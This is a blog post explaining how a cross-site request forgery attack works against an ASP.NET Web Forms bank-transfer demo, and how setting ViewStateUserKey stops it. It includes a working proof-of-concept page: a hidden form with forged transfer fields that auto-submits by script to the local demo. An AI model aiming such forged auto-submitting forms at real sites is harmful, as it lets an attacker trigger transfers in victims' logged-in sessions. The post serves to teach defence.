---
layout: post
title: "CSRF Attacks and Web Forms"
date: 2009-04-02 -0800
comments: true
disqus_identifier: 18606
categories: [asp.net]
---
In [my last blog
post](http://haacked.com/archive/2009/04/02/anatomy-of-csrf-attack.aspx "Anatomy of a CSRF attack"),
I walked step by step through a [Cross-site request
forgery](http://en.wikipedia.org/wiki/CSRF "CSRF on Wikipedia") (CSRF)
attack against an ASP.NET MVC web application. This attack is the result
of how browsers handle cookies and cross domain form posts and is not
specific to any one web platform. Many web platforms thus include their
own mitigations to the problem.

It might seem that if you’re using Web Forms, you’re automatically safe
from this attack. While Web Forms has many mitigations turned on by
default, it turns out that it does not automatically protect your site
against this specific form of attack.

In the same [sample bank transfer
application](http://code.haacked.com/mvc-2/CsrfDemo.zip "Bank Transfer CSRF Demo")
I provided in the last post, I also included an example written using
Web Forms which demonstrates the CSRF attack. After you log in to the
site, you can navigate to `/BankWebForm/default.aspx` to try out the Web
Form version of the transfer money page. it works just like the MVC
version.

To simulate the attack, make sure you are running the sample application
locally and make sure you are logged in and then click on
[http://haacked.com/demos/csrf-webform.html](http://demo.haacked.com/security/csrf-webform.html "CSRF for Web Form Demo").

Here’s the code for that page:

```csharp
<html xmlns="http://www.w3.org/1999/xhtml" >
<head>
    <title></title>
</head>
<body>
  <form name="badform" method="post"
    action="http://localhost:54607/BankWebForm/Default.aspx">
    <input type="hidden" name="ctl00$MainContent$amountTextBox"
      value="1000" />
    <input type="hidden" name="ctl00$MainContent$destinationAccountDropDown"
      value="2" />
    <input type="hidden" name="ctl00$MainContent$submitButton"
      value="Transfer" />
    <input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET"
      value="" />
    <input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT"
      value="" />
    <input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE"
      value="/wEP...0ws8kIw=" />
    <input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION"
      value="/wEWBwK...+FaB85Nc" />
    </form>
    <script type="text/javascript">
        document.badform.submit();
    </script>
</body>
</html>
```

It’s a bit more involved, but it does the trick. It mocks up all the
proper hidden fields required to execute a bank transfer on my silly
demo site.

The mitigation for this attack is pretty simple and described thoroughly
in this [this article by Dino
Esposito](http://msdn.microsoft.com/en-us/library/ms972969.aspx "Take Advantage of ASP.NET Built-in Features to Fend Off Web Attacks")
as well as this [post by Scott
Hanselman](http://www.hanselman.com/blog/ViewStateUserKeyMakesViewStateMoreTamperresistant.aspx%20 "ViewState").
The change I made to my code behind based on Dino’s recommendation is
the following:

```csharp
protected override void OnInit(EventArgs e) {
  ViewStateUserKey = Session.SessionID;
  base.OnInit(e);
}
```

With this change in place, the CSRF attack I put in place no longer
works.

When you go to a real bank site, you’ll learn they have all sorts of
protections in place above and beyond what I described here. Hopefully
this post and the previous one provided some insight into why they do
all the things they do. :)

Technorati Tags:
[asp.net](http://technorati.com/tags/asp.net),[security](http://technorati.com/tags/security)

